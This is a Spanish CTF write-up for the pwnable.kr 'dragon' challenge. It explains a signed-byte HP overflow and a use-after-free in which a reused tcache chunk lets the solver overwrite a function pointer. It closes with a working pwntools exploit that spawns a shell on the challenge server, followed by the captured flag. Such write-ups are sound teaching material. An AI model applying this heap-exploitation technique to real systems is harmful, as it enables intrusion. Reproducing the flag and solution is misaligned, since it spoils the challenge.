# dragon

<img width="128" height="162" alt="dragon" src="https://github.com/user-attachments/assets/23de8801-15dc-4517-bd56-3443cafaca81" />

```
$ checksec dragon
[*] '/home/kalcast/Laboratorio/pwn/dragon'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

## Desarrollo
Podemos observar en PlayGame una funcion `SecretLevel` que invoca a `system("/bin/sh")` pero no podremos escribir la contraseña correcta porque la entrada de usuario esta limitada a 10 caracteres:
```C
void PlayGame(void)

{
  int hero_number;
  
  while( true ) {
    while( true ) {
      puts("Choose Your Hero\n[ 1 ] Priest\n[ 2 ] Knight") ;
      hero_number = GetChoice();
      if ((hero_number != 1) && (hero_number != 2)) bre ak;
      FightDragon(hero_number);
    }
    if (hero_number != 3) break;
    SecretLevel();
  }
  return;
}

void SecretLevel(void)

{
  int iVar1;
  int in_GS_OFFSET;
  char user_input [10];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  printf("Welcome to Secret Level!\nInput Password : ") ;
  __isoc99_scanf(&DAT_0804932f__%10s,user_input);
  iVar1 = strcmp(user_input,"Nice_Try_But_The_Drago ns_Won\'t_Let_You!");
  if (iVar1 != 0) {
    puts("Wrong!\n");
                    /* WARNING: Subroutine does not return * /
    exit(-1);
  }
  system("/bin/sh");
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return * /
    __stack_chk_fail();
  }
  return;
}
```

Use Ghidra para crear estructuras para los objetos Hero y Dragon:

<img width="1365" height="725" alt="2025-08-29-093309_1365x725_scrot" src="https://github.com/user-attachments/assets/30808b89-4871-4a94-add2-3210606c5b5d" />

<img width="1365" height="725" alt="2025-08-29-093330_1365x725_scrot" src="https://github.com/user-attachments/assets/ceef3e8b-cffe-436c-a7a7-20456c187dd6" />
Nota: Algunos tipos a lo mejor deben ser `int` y no `uint` pero eran irrelevantes para el caso actual.
<br></br>
Como se puede notar el valor de HP de un Dragon es un byte con signo, porque en el desensamblado podemos ver que al ver si el dragon esta derrotado se usa `test` para verificar el bit de signo:
```asm
                   08048ae6  0f b6 40 08                MOVZX             EAX,byte ptr [EAX + 0x8]
                   08048aea  84 c0                      TEST              AL,AL
                   08048aec  7f 12                      JG                LAB_08048b00
```

## ¿Como ganar?
- El rango de valores de un int8_t va de {-128,127}
- El segundo monstruo al que nos enfrentamos es Mama Dragon con 80 de HP y +4 de LifeRegeneration

Si elegimos al Priest y usamos Holy Shield + Holy Shield + Clarity aguantamos varios turnos hasta que el HP de Mama Dragon se desborde y acabe siendo negativo:
Un pequeño ejemplo:
``` C
int main(){
  signed char a = 127;
  a++;
  printf("%d",a);
}
```

```
  Valores de Dragon->HP
  84,88,92,
  96,100,104,
  108,112,116,
  120,124,-128
```

## Chunk corrupto
Una vez ganamos se ejecuta este bloque:
``` C
  else {
    puts("Well Done Hero! You Killed The Dragon!");
    puts("The World Will Remember You As:");
    your_name = malloc(0x10);
    __isoc99_scanf(&DAT_08049108__%16s__,your_nam e);
    puts("And The Dragon You Have Defeated Was Call ed:");
    (*(code *)Dragon->Info)(Dragon);
  }
```

Hay algo importante que tenemos que notar. Hero, Dragon y your_name son punteros a chunks del heap todos del mismo tamaño, eso significa que van a la misma tcachebin. Al iniciar el combate estas estructuras lucen asi:
```
 HEAP: chunk1(Hero) chunk2(Dragon)
 TCACHEBIN 0X10: HEAD
```

Al ganar se ejecuta `free(Dragon)`:
```
 HEAP: chunk1(Hero) free_chunk2(Dragon)
 TCACHEBIN 0X10: chunk2(Dragon) -> HEAD
```

Entonces al ejecutarse`your_name = malloc(0x10);` se reutiliza ese chunk de la tcache:
```
 HEAP: chunk1(Hero) chunk2(your_name)
 TCACHEBIN 0X10: HEAD
```

Y lo mas importante es que el puntero al chunk de la estructura Dragon NO se ha hecho = NULL, por lo que sigue apuntando al mismo chunk haciendo que este codigo: `(*(code *)Dragon->Info)(Dragon);` intente ejecutar la direccion que se forma por los 4 primeros bytes de la entrada de usuario.

Escribimos la direccion de `SecretLevel()` despues de la comprobacion de la contraseña y obtenemos la shell.

## Exploit
``` py
from pwn import *

p = remote("pwnable.kr",9004)
#p = process("./dragon")
# Choose Knight against Baby Dragon
p.sendline(b"2")
# Use Frenzy and lose
p.sendline(b"2")
# Choose Priest against Mama Dragon
p.sendline(b"1")
# Hold on with HolyShield + HolyShield + Clarity until you unleash an integer overflow
while b"Well Done Hero! You Killed The Dragon!" not in p.recv():
    p.sendline(b"3\n3\n2")
    pause(1)
# Overwrite Dragon->PrintMonsterInfo with system("/bin/bash") address
p.sendline(p32(0x08048dbf))
# Shell
p.interactive()
```

`p3ac3_1s_th3_k3y`

